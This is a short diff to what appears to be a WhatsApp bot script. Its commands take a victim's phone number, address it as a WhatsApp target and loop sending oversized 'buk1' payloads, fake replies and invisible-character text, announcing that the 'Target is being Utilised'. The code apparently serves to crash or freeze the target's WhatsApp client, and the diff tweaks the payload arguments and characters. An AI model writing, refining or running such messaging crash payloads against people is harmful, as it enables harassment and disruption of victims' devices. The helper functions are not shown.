@@ -537,7 +537,7 @@ if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(`Wait Your Target is being Utilised`)
 for (let i = 0; i < 2; i++) {
-await buk1(sam, target, "SPIDER", 1020000, ptcp = true);
+await buk1(sam, target, 1020000, ptcp = true);
 await sendRp(target, fake)
 await sendRp(target, fake)
 await beta2(sam, target, fake)
@@ -563,10 +563,12 @@ target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
     const toInvisibleText = (text) => {
-        return text.split('').map(char => '' + char).join('');
+        return text.split('').map(char => '
+' + char).join('');
     };
 
-    const invisibleText = toInvisibleText(".");
+    const invisibleText = toInvisibleText("
+");
 
     for (let i = 0; i < 2; i++) {
         await buk1(sam, target, invisibleText, 1020000, true);
